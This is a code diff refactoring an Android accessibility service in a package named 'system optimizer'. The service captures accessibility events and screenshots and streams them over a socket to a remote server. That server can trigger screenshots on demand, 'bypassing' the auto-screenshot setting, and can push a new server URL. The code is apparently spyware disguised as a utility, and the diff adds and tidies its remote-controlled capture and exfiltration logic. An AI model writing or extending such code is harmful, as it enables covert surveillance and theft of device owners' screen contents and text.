@@ -1,10 +1,11 @@
-package com.system.optimizer;
+package com.system.optimizer.service;
 
-import com.system.optimizer.handler.AccessibilityEventHandler;
-import com.system.optimizer.handler.ScreenshotManager;
+import com.system.optimizer.event.AccessibilityEventHandler;
+import com.system.optimizer.service.ScreenshotCallback;
 import com.system.optimizer.config.ConfigData;
-import com.system.optimizer.config.ConfigManager;
+import com.system.optimizer.config.AppConfig;
 import com.system.optimizer.network.SocketManager;
+import java.util.function.BiConsumer;
 
 import java.io.ByteArrayOutputStream;
 
@@ -18,44 +19,29 @@ import android.accessibilityservice.AccessibilityService;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 
-public class AccessibilityLoggerService extends AccessibilityService {
-    private static final String TAG = "AccessibilityLoggerService";
+public class AccessibilityMonitorService extends AccessibilityService {
+    private static final String TAG = "AccessibilityMonitorService";
 
     private SocketManager socketManager;
-    private ConfigManager configManager;
+    private AppConfig appConfig;
     private AccessibilityEventHandler accessibilityEventHandler;
-    private ScreenshotManager screenshotManager;
 
     @Override
     public void onCreate() {
         super.onCreate();
-        Log.d(TAG, "AccessibilityLoggerService onCreate - initializing components");
+        Log.d(TAG, "AccessibilityMonitorService onCreate - initializing components");
 
         try {
-            this.configManager = new ConfigManager(this);
+            this.appConfig = new AppConfig(this);
 
-            this.socketManager = new SocketManager(configManager);
-
-            this.screenshotManager = new ScreenshotManager(this::performSystemCapture, configManager);
+            this.socketManager = new SocketManager(appConfig);
 
             // Create text handler with screenshot capture reference
-            this.accessibilityEventHandler = new AccessibilityEventHandler(screenshotManager, socketManager);
+            this.accessibilityEventHandler = new AccessibilityEventHandler(this::takeScreenshotViaAccessibility, appConfig, socketManager);
 
             this.socketManager.addPersistentListener("screenshot", args -> {
-                // Capture screenshot and send as response
-                screenshotManager.takeScreenshot(new ScreenshotManager.ScreenshotCallback() {
-                    @Override
-                    public void onSuccess(byte[] imageData) {
-                        if (imageData != null) {
-                            socketManager.sendEvent("screenshot_response", imageData);
-                        }
-                    }
-
-                    @Override
-                    public void onError(String errorMessage) {
-                        socketManager.sendEvent("screenshot_error", errorMessage);
-                    }
-                }, true); // isManual=true for user-initiated requests
+                // Trigger manual screenshot capture (bypasses auto_screenshot config)
+                accessibilityEventHandler.triggerManualCapture();
             });
 
             this.socketManager.addPersistentListener("config_data", args -> {
@@ -64,14 +50,14 @@ public class AccessibilityLoggerService extends AccessibilityService {
                     try {
                         org.json.JSONObject configJson = (org.json.JSONObject) args[0];
 
-                        ConfigData serverConfig = configManager.createConfigFromJson(configJson);
+                        ConfigData serverConfig = appConfig.createConfigFromJson(configJson);
                         String newServerUrl = serverConfig.getServerUrl();
 
                         // Get current stored URL before updating config
-                        String currentServerUrl = configManager.getStoredServerUrl();
+                        String currentServerUrl = appConfig.getStoredServerUrl();
 
                         Log.d(TAG, "Refreshing config data from server");
-                        configManager.setConfig(serverConfig);
+                        appConfig.setConfig(serverConfig);
 
                         // Check if server URL has changed
                         if (currentServerUrl == null || !currentServerUrl.equals(newServerUrl)) {
@@ -123,23 +109,23 @@ public class AccessibilityLoggerService extends AccessibilityService {
         }
     }
 
-    private void performSystemCapture(ScreenshotManager.ScreenshotCallback clientCallback, int quality) {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            takeScreenshot(android.view.Display.DEFAULT_DISPLAY,
-                    getMainExecutor(), new ScreenshotResultHandler(clientCallback, quality));
-        } else {
+    private void takeScreenshotViaAccessibility(ScreenshotCallback clientCallback, int quality) {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
             clientCallback.onError("API < 30 not supported");
+            return;
         }
+        takeScreenshot(android.view.Display.DEFAULT_DISPLAY,
+                getMainExecutor(), new ScreenshotResultHandler(clientCallback, quality));
     }
 
     /**
      * Callback handler for Screenshot result.
      */
     private class ScreenshotResultHandler implements AccessibilityService.TakeScreenshotCallback {
-        private final ScreenshotManager.ScreenshotCallback clientCallback;
+        private final ScreenshotCallback clientCallback;
         private final int quality;
 
-        ScreenshotResultHandler(ScreenshotManager.ScreenshotCallback callback, int quality) {
+        ScreenshotResultHandler(ScreenshotCallback callback, int quality) {
             this.clientCallback = callback;
             this.quality = quality;
         }
